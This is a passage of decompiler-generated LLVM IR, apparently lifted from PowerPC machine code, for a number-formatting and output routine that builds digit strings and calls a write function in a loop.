  %v0_100110fc = phi i1 [ %v1_100110b8, %dec_label_pc_100110b8 ], [ false, %dec_label_pc_100110ac ], [ %v0_100110fc.pre, %dec_label_pc_100110c4 ]
  %v1_100110e8 = phi i32 [ %v1_10011074, %dec_label_pc_100110b8 ], [ %v1_10011074, %dec_label_pc_100110ac ], [ %v1_100110e8.pre, %dec_label_pc_100110c4 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_100110d8 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_100110d8, i32* %r0.global-to-local, align 4
  %v0_100110e0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100110e0 = add i32 %v0_100110e0, 1
  store i32 %v1_100110e0, i32* %r6.global-to-local, align 4
  %v2_100110e8 = sub i32 %v1_100110e8, %v1_100110e0
  store i32 %v2_100110e8, i32* %r11.global-to-local, align 4
  %v1_100110ec = inttoptr i32 %v0_100110e0 to i8*
  %v2_100110ec = load i8, i8* %v1_100110ec, align 1
  %v3_100110ec = zext i8 %v2_100110ec to i32
  store i32 %v3_100110ec, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_100110fc, label %dec_label_pc_1001115c, label %dec_label_pc_10011100

dec_label_pc_10011100:                            ; preds = %dec_label_pc_100110cc
  %v0_10011100 = load i32, i32* %r10.global-to-local, align 4
  %v2_10011100 = icmp slt i32 %v0_10011100, %v2_100110e8
  %v4_10011100 = icmp eq i32 %v0_10011100, %v2_100110e8
  store i1 %v2_10011100, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011100, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_10011100, label %dec_label_pc_10011154, label %dec_label_pc_10011114

dec_label_pc_10011114:                            ; preds = %dec_label_pc_10011100
  %v2_10011114 = sub i32 %v0_10011100, %v2_100110e8
  store i32 %v2_10011114, i32* %r0.global-to-local, align 4
  %v4_10011114 = icmp sgt i32 %v2_10011114, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_10011114, label %dec_label_pc_10011130, label %dec_label_pc_10011120

dec_label_pc_10011120:                            ; preds = %dec_label_pc_10011114
  %v2_10011124 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10011124, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011178

dec_label_pc_10011130:                            ; preds = %dec_label_pc_10011114
  store i32 ptrtoint (i32* @global_var_1001a463.800 to i32), i32* %r9.global-to-local, align 4
  %v2_1001113c = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_1001113c, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_10011178

dec_label_pc_10011154:                            ; preds = %dec_label_pc_10011100
  %v0_10011154 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10011154, label %dec_label_pc_10011164, label %dec_label_pc_10011158

dec_label_pc_10011158:                            ; preds = %dec_label_pc_10011154
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001115c

dec_label_pc_1001115c:                            ; preds = %dec_label_pc_100110cc, %dec_label_pc_10011158
  %v2_1001115c = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1001115c, i32* @r8, align 4
  br label %dec_label_pc_10011178

dec_label_pc_10011164:                            ; preds = %dec_label_pc_10011154
  %v2_10011164 = sub i32 %v2_100110e8, %v0_10011100
  store i32 %v2_10011164, i32* %r11.global-to-local, align 4
  %v2_1001116c = add i32 %v0_10011100, %v1_100110e0
  store i32 %v2_1001116c, i32* %r6.global-to-local, align 4
  %v2_10011170 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10011170, i32* @r8, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011178

dec_label_pc_10011178:                            ; preds = %dec_label_pc_1001115c, %dec_label_pc_10011130, %dec_label_pc_10011120, %dec_label_pc_10011164
  %v1_100111a4 = phi i32 [ %v2_1001115c, %dec_label_pc_1001115c ], [ %v2_1001113c, %dec_label_pc_10011130 ], [ %v2_10011124, %dec_label_pc_10011120 ], [ %v2_10011170, %dec_label_pc_10011164 ]
  %v0_10011184 = phi i32 [ %v2_100110e8, %dec_label_pc_1001115c ], [ 0, %dec_label_pc_10011130 ], [ 0, %dec_label_pc_10011120 ], [ %v2_10011164, %dec_label_pc_10011164 ]
  %v3_10011178 = load i32, i32* %v2_10010d48, align 4
  store i32 %v3_10011178, i32* %r0.global-to-local, align 4
  %v1_1001117c = and i32 %v3_10011178, 16
  store i32 %v1_1001117c, i32* %r9.global-to-local, align 4
  %v3_1001117c = icmp eq i32 %v1_1001117c, 0
  br i1 %v3_1001117c, label %dec_label_pc_10011184, label %dec_label_pc_1001119c

dec_label_pc_10011184:                            ; preds = %dec_label_pc_10011178
  %v1_10011184 = icmp slt i32 %v0_10011184, 0
  %v3_10011184 = icmp eq i32 %v0_10011184, 0
  store i1 %v1_10011184, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011184, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011184, label %dec_label_pc_1001118c, label %dec_label_pc_1001119c

dec_label_pc_1001118c:                            ; preds = %dec_label_pc_10011184
  %v0_1001118c = load i32, i32* %r31.global-to-local, align 4
  %v1_1001118c = icmp slt i32 %v0_1001118c, 103
  %v3_1001118c = icmp eq i32 %v0_1001118c, 103
  store i1 %v1_1001118c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001118c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001118c, label %dec_label_pc_100111bc, label %dec_label_pc_10011194

dec_label_pc_10011194:                            ; preds = %dec_label_pc_1001118c
  %v0_10011194 = load i32, i32* %r30.global-to-local, align 4
  %v1_10011194 = icmp slt i32 %v0_10011194, 0
  %v3_10011194 = icmp eq i32 %v0_10011194, 0
  store i1 %v1_10011194, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011194, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_10011194, 1
  br i1 %tmp79, label %dec_label_pc_100111bc, label %dec_label_pc_1001119c

dec_label_pc_1001119c:                            ; preds = %dec_label_pc_10011184, %dec_label_pc_10011178, %dec_label_pc_10011194
  %v2_100111a4 = inttoptr i32 %v1_100111a4 to i32*
  store i32 112, i32* %v2_100111a4, align 4
  store i32 ptrtoint (i32* @global_var_1001a470.801 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_100111b0 = load i32, i32* @r8, align 4
  %v2_100111b0 = add i32 %v1_100111b0, 8
  %v3_100111b0 = inttoptr i32 %v2_100111b0 to i32*
  store i32 ptrtoint (i32* @global_var_1001a470.801 to i32), i32* %v3_100111b0, align 4
  %v0_100111b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100111b4 = load i32, i32* @r8, align 4
  %v2_100111b4 = add i32 %v1_100111b4, 4
  %v3_100111b4 = inttoptr i32 %v2_100111b4 to i32*
  store i32 %v0_100111b4, i32* %v3_100111b4, align 4
  %v0_100111b8 = load i32, i32* @r8, align 4
  %v1_100111b8 = add i32 %v0_100111b8, 12
  store i32 %v1_100111b8, i32* @r8, align 4
  br label %dec_label_pc_100111bc

dec_label_pc_100111bc:                            ; preds = %dec_label_pc_10011194, %dec_label_pc_1001118c, %dec_label_pc_1001119c
  %v1_100111cc = phi i32 [ %v1_100111a4, %dec_label_pc_10011194 ], [ %v1_100111a4, %dec_label_pc_1001118c ], [ %v1_100111b8, %dec_label_pc_1001119c ]
  %v0_100111bc = load i32, i32* %r10.global-to-local, align 4
  %v1_100111bc = add i32 %v0_100111bc, 1
  store i32 %v1_100111bc, i32* %r10.global-to-local, align 4
  %v4_100111bc = icmp eq i32 %v1_100111bc, 0
  br i1 %v4_100111bc, label %dec_label_pc_100111e4, label %dec_label_pc_100111c4

dec_label_pc_100111c4:                            ; preds = %dec_label_pc_100111bc
  %v1_100111c4 = sub i32 -1, %v0_100111bc
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_100111cc = add i32 %v1_100111cc, 4
  %v3_100111cc = inttoptr i32 %v2_100111cc to i32*
  store i32 %v1_100111c4, i32* %v3_100111cc, align 4
  store i32 ptrtoint (i32* @global_var_1001a463.800 to i32), i32* %r9.global-to-local, align 4
  %v0_100111d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100111d8 = load i32, i32* @r8, align 4
  %v2_100111d8 = inttoptr i32 %v1_100111d8 to i32*
  store i32 %v0_100111d8, i32* %v2_100111d8, align 4
  %v0_100111dc = load i32, i32* %r9.global-to-local, align 4
  %v1_100111dc = load i32, i32* @r8, align 4
  %v2_100111dc = add i32 %v1_100111dc, 8
  %v3_100111dc = inttoptr i32 %v2_100111dc to i32*
  store i32 %v0_100111dc, i32* %v3_100111dc, align 4
  %v0_100111e0 = load i32, i32* @r8, align 4
  %v1_100111e0 = add i32 %v0_100111e0, 12
  store i32 %v1_100111e0, i32* @r8, align 4
  br label %dec_label_pc_100111e4

dec_label_pc_100111e4:                            ; preds = %dec_label_pc_100111bc, %dec_label_pc_100111c4
  %v1_100111f0 = phi i32 [ %v1_100111cc, %dec_label_pc_100111bc ], [ %v1_100111e0, %dec_label_pc_100111c4 ]
  %v0_100111e4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100111e4 = icmp slt i32 %v0_100111e4, 0
  %v3_100111e4 = icmp eq i32 %v0_100111e4, 0
  store i1 %v1_100111e4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100111e4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100111e4, label %dec_label_pc_10011200, label %dec_label_pc_100111ec

dec_label_pc_100111ec:                            ; preds = %dec_label_pc_100111e4
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_100111f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_100111f0 = add i32 %v1_100111f0, 8
  %v3_100111f0 = inttoptr i32 %v2_100111f0 to i32*
  store i32 %v0_100111f0, i32* %v3_100111f0, align 4
  %v0_100111f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100111f4 = load i32, i32* @r8, align 4
  %v2_100111f4 = inttoptr i32 %v1_100111f4 to i32*
  store i32 %v0_100111f4, i32* %v2_100111f4, align 4
  %v0_100111f8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100111f8 = load i32, i32* @r8, align 4
  %v2_100111f8 = add i32 %v1_100111f8, 4
  %v3_100111f8 = inttoptr i32 %v2_100111f8 to i32*
  store i32 %v0_100111f8, i32* %v3_100111f8, align 4
  %v0_100111fc = load i32, i32* @r8, align 4
  %v1_100111fc = add i32 %v0_100111fc, 12
  store i32 %v1_100111fc, i32* @r8, align 4
  br label %dec_label_pc_10011200

dec_label_pc_10011200:                            ; preds = %dec_label_pc_100111e4, %dec_label_pc_100111ec
  %v1_10011228 = phi i32 [ %v1_100111f0, %dec_label_pc_100111e4 ], [ %v1_100111fc, %dec_label_pc_100111ec ]
  %v0_10011200 = load i32, i32* %r31.global-to-local, align 4
  %v1_10011200 = icmp slt i32 %v0_10011200, 103
  %v3_10011200 = icmp eq i32 %v0_10011200, 103
  store i1 %v1_10011200, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011200, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011200, label %dec_label_pc_10011208, label %dec_label_pc_10011214

dec_label_pc_10011208:                            ; preds = %dec_label_pc_10011200
  %v3_10011208 = load i32, i32* %v2_10010d48, align 4
  store i32 %v3_10011208, i32* %r0.global-to-local, align 4
  %v1_1001120c = and i32 %v3_10011208, 16
  store i32 %v1_1001120c, i32* %r9.global-to-local, align 4
  %v3_1001120c = icmp eq i32 %v1_1001120c, 0
  br i1 %v3_1001120c, label %dec_label_pc_10011240, label %dec_label_pc_10011214

dec_label_pc_10011214:                            ; preds = %dec_label_pc_10011200, %dec_label_pc_10011208
  %v0_10011214 = load i32, i32* %r10.global-to-local, align 4
  %v1_10011214 = load i32, i32* %r11.global-to-local, align 4
  %v2_10011214 = sub i32 %v1_10011214, %v0_10011214
  store i32 %v2_10011214, i32* %r9.global-to-local, align 4
  %v1_10011218 = load i32, i32* %r30.global-to-local, align 4
  %v2_10011218 = icmp sgt i32 %v1_10011218, %v2_10011214
  %v4_10011218 = icmp eq i32 %v1_10011218, %v2_10011214
  store i1 %v2_10011218, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011218, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10011218, label %dec_label_pc_10011220, label %dec_label_pc_10011240

dec_label_pc_10011220:                            ; preds = %dec_label_pc_10011214
  %v2_10011220 = sub i32 %v1_10011218, %v2_10011214
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_10011228 = add i32 %v1_10011228, 4
  %v3_10011228 = inttoptr i32 %v2_10011228 to i32*
  store i32 %v2_10011220, i32* %v3_10011228, align 4
  store i32 ptrtoint (i32* @global_var_1001a463.800 to i32), i32* %r9.global-to-local, align 4
  %v0_10011234 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011234 = load i32, i32* @r8, align 4
  %v2_10011234 = inttoptr i32 %v1_10011234 to i32*
  store i32 %v0_10011234, i32* %v2_10011234, align 4
  %v0_10011238 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011238 = load i32, i32* @r8, align 4
  %v2_10011238 = add i32 %v1_10011238, 8
  %v3_10011238 = inttoptr i32 %v2_10011238 to i32*
  store i32 %v0_10011238, i32* %v3_10011238, align 4
  %v0_1001123c = load i32, i32* @r8, align 4
  %v1_1001123c = add i32 %v0_1001123c, 12
  store i32 %v1_1001123c, i32* @r8, align 4
  br label %dec_label_pc_10011240

dec_label_pc_10011240:                            ; preds = %dec_label_pc_10011214, %dec_label_pc_10011208, %dec_label_pc_10011220
  %v1_100112d437 = phi i32 [ %v1_10011228, %dec_label_pc_10011214 ], [ %v1_10011228, %dec_label_pc_10011208 ], [ %v1_1001123c, %dec_label_pc_10011220 ]
  %v0_10011240 = load i32, i32* %r4.global-to-local, align 4
  %v1_10011240 = icmp slt i32 %v0_10011240, 102
  %v3_10011240 = icmp eq i32 %v0_10011240, 102
  store i1 %v1_10011240, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011240, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011240, label %dec_label_pc_100112c8, label %dec_label_pc_10011248

dec_label_pc_10011248:                            ; preds = %dec_label_pc_10011240
  %v0_10011248 = load i32, i32* @r7, align 4
  %v1_10011248 = icmp slt i32 %v0_10011248, 0
  %v3_10011248 = icmp eq i32 %v0_10011248, 0
  store i1 %v1_10011248, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011248, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_10011248, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_10011248, -1
  br i1 %tmp80, label %dec_label_pc_10011264, label %dec_label_pc_1001125c

dec_label_pc_1001125c:                            ; preds = %dec_label_pc_10011248
  %v1_1001125c = sub i32 0, %v0_10011248
  store i32 %v1_1001125c, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10011264

dec_label_pc_10011264:                            ; preds = %dec_label_pc_10011248, %dec_label_pc_1001125c
  %v0_1001127831 = phi i32 [ %v0_10011248, %dec_label_pc_10011248 ], [ %v1_1001125c, %dec_label_pc_1001125c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10011268 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_10011268, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10011278

dec_label_pc_10011278:                            ; preds = %dec_label_pc_10011278.backedge, %dec_label_pc_10011264
  %v2_10011298 = phi i32 [ %v3_10011298, %dec_label_pc_10011278.backedge ], [ %v2_10011268, %dec_label_pc_10011264 ]
  %v0_1001127c = phi i32 [ %v0_1001127c.pre, %dec_label_pc_10011278.backedge ], [ 2, %dec_label_pc_10011264 ]
  %v1_10011278 = phi i32 [ %v1_10011278.pre, %dec_label_pc_10011278.backedge ], [ 10, %dec_label_pc_10011264 ]
  %v1_1001128c = phi i32 [ %v0_10011278.pre, %dec_label_pc_10011278.backedge ], [ %v0_1001127831, %dec_label_pc_10011264 ]
  %v2_10011278 = sdiv i32 %v1_1001128c, %v1_10011278
  store i32 %v2_10011278, i32* %r0.global-to-local, align 4
  %v1_1001127c = add i32 %v0_1001127c, 1
  store i32 %v1_1001127c, i32* @r7, align 4
  %v1_10011280 = icmp slt i32 %v1_1001127c, 3
  %v3_10011280 = icmp eq i32 %v1_1001127c, 3
  store i1 %v1_10011280, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011280, i1* %cr7_eq.global-to-local, align 1
  %v1_10011288 = icmp slt i32 %v2_10011278, 0
  %v2_10011288 = icmp sgt i32 %v2_10011278, 0
  %v3_10011288 = icmp eq i32 %v2_10011278, 0
  store i1 %v1_10011288, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10011288, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10011288, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_10011278, -10
  store i32 %v2_10011278, i32* %r11.global-to-local, align 4
  %v2_1001128c = add i32 %v1_1001128c, 48
  %v1_10011294 = add i32 %v2_1001128c, %tmp81
  store i32 %v1_10011294, i32* %r9.global-to-local, align 4
  %v1_10011298 = trunc i32 %v1_10011294 to i8
  %v3_10011298 = add i32 %v2_10011298, -1
  %v4_10011298 = inttoptr i32 %v3_10011298 to i8*
  store i8 %v1_10011298, i8* %v4_10011298, align 1
  store i32 %v3_10011298, i32* %r10.global-to-local, align 4
  %v0_1001129c = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1001129c = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1001129c = or i1 %v0_1001129c, %v1_1001129c
  br i1 %v2_1001129c, label %dec_label_pc_10011278.backedge, label %dec_label_pc_100112a0

dec_label_pc_10011278.backedge:                   ; preds = %dec_label_pc_10011278, %dec_label_pc_100112a0
  %v0_10011278.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10011278.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1001127c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10011278

dec_label_pc_100112a0:                            ; preds = %dec_label_pc_10011278
  %v0_100112a0 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_100112a0, label %dec_label_pc_100112a4, label %dec_label_pc_10011278.backedge

dec_label_pc_100112a4:                            ; preds = %dec_label_pc_100112a0
  %v1_100112a4 = add i32 %v2_10011298, -2
  store i32 %v1_100112a4, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_100112ac = add i32 %v2_10011298, -3
  store i32 %v1_100112ac, i32* %r11.global-to-local, align 4
  %v0_100112b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100112b0 = trunc i32 %v0_100112b0 to i8
  %v4_100112b0 = inttoptr i32 %v1_100112a4 to i8*
  store i8 %v1_100112b0, i8* %v4_100112b0, align 1
  %v0_100112b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_100112b4 = trunc i32 %v0_100112b4 to i8
  %v2_100112b4 = load i32, i32* %r9.global-to-local, align 4
  %v3_100112b4 = add i32 %v2_100112b4, -1
  %v4_100112b4 = inttoptr i32 %v3_100112b4 to i8*
  store i8 %v1_100112b4, i8* %v4_100112b4, align 1
  %v0_100112b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100112b8 = load i32, i32* @r8, align 4
  %v2_100112b8 = inttoptr i32 %v1_100112b8 to i32*
  store i32 %v0_100112b8, i32* %v2_100112b8, align 4
  %v0_100112bc = load i32, i32* @r7, align 4
  %v1_100112bc = load i32, i32* @r8, align 4
  %v2_100112bc = add i32 %v1_100112bc, 4
  %v3_100112bc = inttoptr i32 %v2_100112bc to i32*
  store i32 %v0_100112bc, i32* %v3_100112bc, align 4
  %v0_100112c0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100112c0 = load i32, i32* @r8, align 4
  %v2_100112c0 = add i32 %v1_100112c0, 8
  %v3_100112c0 = inttoptr i32 %v2_100112c0 to i32*
  store i32 %v0_100112c0, i32* %v3_100112c0, align 4
  %v0_100112c4 = load i32, i32* @r8, align 4
  %v1_100112c4 = add i32 %v0_100112c4, 12
  store i32 %v1_100112c4, i32* @r8, align 4
  br label %dec_label_pc_100112c8

dec_label_pc_100112c8:                            ; preds = %dec_label_pc_10011240, %dec_label_pc_10010e1c, %dec_label_pc_100112a4
  %v0_10011344 = phi i32 [ %v1_100112d437, %dec_label_pc_10011240 ], [ %v2_10010e28, %dec_label_pc_10010e1c ], [ %v1_100112c4, %dec_label_pc_100112a4 ]
  %v2_100112c8 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_100112c8, i32* %r9.global-to-local, align 4
  %v1_100112d8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100112cc

dec_label_pc_100112cc:                            ; preds = %dec_label_pc_100112cc, %dec_label_pc_100112c8
  %v1_100112d8 = phi i32 [ %v2_100112d8, %dec_label_pc_100112cc ], [ %v1_100112d8.pre, %dec_label_pc_100112c8 ]
  %v0_100112cc = phi i32 [ %v1_100112d0, %dec_label_pc_100112cc ], [ %v2_100112c8, %dec_label_pc_100112c8 ]
  %v1_100112cc = inttoptr i32 %v0_100112cc to i32*
  %v2_100112cc = load i32, i32* %v1_100112cc, align 4
  store i32 %v2_100112cc, i32* %r0.global-to-local, align 4
  %v1_100112d0 = add i32 %v0_100112cc, 12
  store i32 %v1_100112d0, i32* %r9.global-to-local, align 4
  %v2_100112d4 = icmp ult i32 %v1_100112d0, %v0_10011344
  %v2_100112d8 = sub i32 %v1_100112d8, %v2_100112cc
  store i32 %v2_100112d8, i32* @r28, align 4
  br i1 %v2_100112d4, label %dec_label_pc_100112cc, label %dec_label_pc_100112e0

dec_label_pc_100112e0:                            ; preds = %dec_label_pc_100112cc
  %v4_100112d4 = icmp eq i32 %v1_100112d0, %v0_10011344
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100112d4, i1* %cr7_eq.global-to-local, align 1
  %v3_100112e0 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_10011344, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_100112e0, 0
  %v1_100112f4 = zext i1 %tmp85 to i32
  store i32 %v1_100112f4, i32* %r9.global-to-local, align 4
  %v2_100112f8 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_100112f8, i32* %r0.global-to-local, align 4
  %v2_100112fc = sub i32 %v2_100112d8, %v1_100112f4
  store i32 %v2_100112fc, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_100112fc, 1
  br i1 %tmp82, label %dec_label_pc_10011368, label %dec_label_pc_1001130c

dec_label_pc_1001130c:                            ; preds = %dec_label_pc_100112e0
  %v3_1001130c = load i32, i32* %v2_10010d48, align 4
  store i32 %v3_1001130c, i32* %r0.global-to-local, align 4
  %v1_10011310 = and i32 %v3_1001130c, 8
  store i32 %v1_10011310, i32* @r7, align 4
  %v3_10011310 = icmp eq i32 %v1_10011310, 0
  br i1 %v3_10011310, label %dec_label_pc_10011334, label %dec_label_pc_10011318

dec_label_pc_10011318:                            ; preds = %dec_label_pc_1001130c
  %v1_1001131c = add i32 %v0_10011344, 12
  store i32 %v1_1001131c, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1001a463.800 to i32), i32* %r9.global-to-local, align 4
  %v2_10011324 = inttoptr i32 %v0_10011344 to i32*
  store i32 160, i32* %v2_10011324, align 4
  %v0_10011328 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011328 = load i32, i32* @r8, align 4
  %v2_10011328 = add i32 %v1_10011328, 4
  %v3_10011328 = inttoptr i32 %v2_10011328 to i32*
  store i32 %v0_10011328, i32* %v3_10011328, align 4
  %v0_1001132c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001132c = load i32, i32* @r8, align 4
  %v2_1001132c = add i32 %v1_1001132c, 8
  %v3_1001132c = inttoptr i32 %v2_1001132c to i32*
  store i32 %v0_1001132c, i32* %v3_1001132c, align 4
  br label %dec_label_pc_10011368

dec_label_pc_10011334:                            ; preds = %dec_label_pc_1001130c
  %v1_10011334 = add i32 %tmp, 16
  %v2_10011334 = inttoptr i32 %v1_10011334 to i32*
  %v3_10011334 = load i32, i32* %v2_10011334, align 4
  store i32 %v3_10011334, i32* %r0.global-to-local, align 4
  %v1_10011338 = icmp slt i32 %v3_10011334, 48
  %v3_10011338 = icmp eq i32 %v3_10011334, 48
  store i1 %v1_10011338, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011338, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011338, label %dec_label_pc_10011340, label %dec_label_pc_1001135c

dec_label_pc_10011340:                            ; preds = %dec_label_pc_10011334
  %v3_10011340 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_10011344, i32* @r30, align 4
  %v2_10011348 = add i32 %v3_10011340, %v2_100112fc
  store i32 %v2_10011348, i32* %r0.global-to-local, align 4
  store i32 %v2_10011348, i32* %stack_var_-140, align 4
  br label %dec_label_pc_10011368

dec_label_pc_10011354:                            ; preds = %dec_label_pc_10011370
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_100113a4

dec_label_pc_1001135c:                            ; preds = %dec_label_pc_10011334
  store i32 %v2_100112d8, i32* %r0.global-to-local, align 4
  store i32 %v0_10011344, i32* @r30, align 4
  br label %dec_label_pc_10011368

dec_label_pc_10011368:                            ; preds = %dec_label_pc_100112e0, %dec_label_pc_10011340, %dec_label_pc_10011318, %dec_label_pc_1001135c
  store i32 0, i32* @r29, align 4
  %v2_1001136c = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1001136c, i32* @r31, align 4
  br label %dec_label_pc_10011370

dec_label_pc_10011370:                            ; preds = %dec_label_pc_100113a0, %dec_label_pc_10011368
  %v0_10011380 = phi i32 [ %v1_1001138c, %dec_label_pc_100113a0 ], [ %v2_1001136c, %dec_label_pc_10011368 ]
  %v1_10011370 = inttoptr i32 %v0_10011380 to i32*
  %v2_10011370 = load i32, i32* %v1_10011370, align 4
  store i32 %v2_10011370, i32* %r4.global-to-local, align 4
  %v0_10011374 = load i32, i32* @r27, align 4
  store i32 %v0_10011374, i32* %r3.global-to-local, align 4
  %v1_10011378 = add i32 %v0_10011380, 4
  %v2_10011378 = inttoptr i32 %v1_10011378 to i32*
  %v3_10011378 = load i32, i32* %v2_10011378, align 4
  store i32 %v3_10011378, i32* %r5.global-to-local, align 4
  %v0_1001137c = load i32, i32* @r26, align 4
  store i32 %v0_1001137c, i32* %ctr.global-to-local, align 4
  %v1_10011380 = add i32 %v0_10011380, 8
  %v2_10011380 = inttoptr i32 %v1_10011380 to i32*
  %v3_10011380 = load i32, i32* %v2_10011380, align 4
  store i32 %v3_10011380, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1001137c)
  %v0_10011388 = load i32, i32* @r31, align 4
  %v1_10011388 = add i32 %v0_10011388, 4
  %v2_10011388 = inttoptr i32 %v1_10011388 to i32*
  %v3_10011388 = load i32, i32* %v2_10011388, align 4
  store i32 %v3_10011388, i32* %r0.global-to-local, align 4
  %v1_1001138c = add i32 %v0_10011388, 12
  store i32 %v1_1001138c, i32* @r31, align 4
  %v0_10011390 = load i32, i32* @r29, align 4
  %v1_10011390 = load i32, i32* %r3.global-to-local, align 4
  %v2_10011390 = add i32 %v1_10011390, %v0_10011390
  store i32 %v2_10011390, i32* @r29, align 4
  %v2_10011394 = icmp slt i32 %v1_10011390, %v3_10011388
  %v4_10011394 = icmp eq i32 %v1_10011390, %v3_10011388
  store i1 %v2_10011394, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011394, i1* %cr7_eq.global-to-local, align 1
  %v1_10011398 = load i32, i32* @r30, align 4
  %v2_10011398 = icmp ult i32 %v1_1001138c, %v1_10011398
  %v3_10011398 = icmp ugt i32 %v1_1001138c, %v1_10011398
  %v4_10011398 = icmp eq i32 %v1_1001138c, %v1_10011398
  store i1 %v2_10011398, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_10011398, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_10011398, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10011394, label %dec_label_pc_100113a0, label %dec_label_pc_10011354

dec_label_pc_100113a0:                            ; preds = %dec_label_pc_10011370
  br i1 %v2_10011398, label %dec_label_pc_10011370, label %dec_label_pc_100113a4

dec_label_pc_100113a4:                            ; preds = %dec_label_pc_100113a0, %dec_label_pc_10011354
  %v0_100113a8 = phi i32 [ -1, %dec_label_pc_10011354 ], [ %v2_10011390, %dec_label_pc_100113a0 ]
  store i32 %v0_10010cf8, i32* %r0.global-to-local, align 4
  store i32 %v0_100113a8, i32* %r3.global-to-local, align 4
  ret i32 %v0_100113a8

; uselistorder directives
  uselistorder i32 %v0_100113a8, { 1, 0 }
  uselistorder i32 %v1_10011390, { 2, 1, 0 }
  uselistorder i32 %v1_1001138c, { 2, 1, 0, 4, 3 }
